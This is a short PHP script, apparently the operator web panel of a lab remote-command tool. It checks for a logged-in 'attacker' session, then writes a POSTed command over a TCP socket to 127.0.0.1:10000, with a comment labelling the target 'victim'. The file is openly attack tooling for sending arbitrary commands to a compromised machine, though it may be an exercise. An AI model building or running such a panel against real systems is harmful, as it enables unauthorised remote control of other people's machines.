<?php
	include('../modules/sessionManager.php');
	include('../modules/databaseManager.php');

    function main(){
        # Connect to database
        $databaseManager = new DatabaseManager();
        $conn = $databaseManager->connectToDatabase();

		# Start session control
        $sessionManager = new SessionManager($conn);
        $sessionManager->startSessionControl();

		# Check if the session is already stored
		if($sessionManager->isCurrentSessionStored("attacker")){
			if(isset($_POST['command'])){
				echo "Comecou os sockets\n";

				# Connection parameters
                $address = "127.0.0.1";
                $port = 10000;

                /*
                Create socket with:
                    AF_INET, meaning IPv4.
                    SOCK_STREAM, meaning stream of bytes, not datagrams on
                    transport layer.
                    SOL_TCP, meaning to use tcp on transport layer.
                */
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if($sock === false) {
                    echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
                }

				# Connect to victim
                $result = socket_connect($sock, $address, $port);
                if ($result === false) {
                    echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
                }

                # Send command
                socket_write($sock, $_POST['command'], strlen($_POST['command']));

				# Close connection
                socket_close($sock);

				echo "Terminou os sockets\n";
			}
        }else{
            echo "Your user is not logged. First login, then enter this page.";
            // 401 Unauthorized
            http_response_code(401);
        }

        # Disconnect from database
        $databaseManager->disconnectFromDatabase();
    }

    main();

?>
